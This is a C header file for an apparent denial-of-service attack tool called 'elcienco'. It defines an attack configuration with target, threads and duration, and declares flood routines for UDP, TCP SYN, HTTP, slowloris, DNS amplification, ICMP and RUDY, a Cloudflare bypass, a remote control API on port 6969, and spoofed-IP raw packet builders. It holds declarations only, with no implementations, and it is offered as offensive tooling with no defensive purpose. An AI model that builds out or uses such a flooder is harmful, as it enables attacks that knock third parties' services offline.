#ifndef ELCIENCO_H
#define ELCIENCO_H

// ============================================
// STANDARD HEADERS
// ============================================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

// ============================================
// PROTOCOL HEADERS (Custom Structures)
// ============================================
#include "protocols.h"

// ============================================
// CONSTANTS
// ============================================
#define MAX_THREADS 2048
#define MAX_PACKET_SIZE 65535
#define API_PORT 6969
#define BUFFER_SIZE 4096
#define API_BUFFER_SIZE 8192
#define API_VERSION "2.3.1"

// ============================================
// ATTACK CONFIG STRUCTURE
// ============================================
typedef struct {
    char target[256];
    int port;
    int threads;
    int duration;
    int method; // 0=UDP, 1=TCP, 2=HTTP, 3=SLOW, 4=DNS, 5=ICMP, 6=RUDY, 7=CFBYPASS
} AttackConfig;

// ============================================
// THREAD DATA STRUCTURE
// ============================================
typedef struct {
    AttackConfig config;
    pthread_t thread_id;
    int thread_num;
    volatile int *running;
} ThreadData;

// ============================================
// CORE ATTACK FUNCTION DECLARATIONS
// ============================================
void *udp_flood(void *arg);
void *tcp_syn_flood(void *arg);
void *http_flood(void *arg);
void *slowloris_attack(void *arg);
void *dns_amplification(void *arg);
void *icmp_flood(void *arg);
void *rudyloris_attack(void *arg);
void *cloudflare_bypass(void *arg);

// ============================================
// API FUNCTION DECLARATIONS
// ============================================
void *api_server(void *arg);
void api_handle_connection(int client_fd);

// ============================================
// UTILITY FUNCTION DECLARATIONS
// ============================================
int create_raw_socket(void);
int create_tcp_socket(void);
int create_udp_socket(void);
int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec);
unsigned short checksum(void *b, int len);
void random_ip(char *ip_buffer);
void random_private_ip(char *ip_buffer);
int is_valid_ip(const char *ip);
int resolve_hostname(const char *hostname, char *ip_buffer);

// ============================================
// PACKET BUILDING FUNCTION DECLARATIONS
// ============================================
void build_ip_header(struct ip_header *iph, const char *src_ip, const char *dst_ip, 
                     int protocol, int payload_len);
void build_tcp_header(struct tcp_header *tcph, int src_port, int dst_port, int flags);
void build_tcp_syn_packet(char *packet, char *src_ip, char *dst_ip, 
                           int src_port, int dst_port);
void build_udp_packet(char *packet, char *src_ip, char *dst_ip, 
                       int src_port, int dst_port);
void build_icmp_echo_packet(char *packet, char *src_ip, char *dst_ip);

#endif // ELCIENCO_H
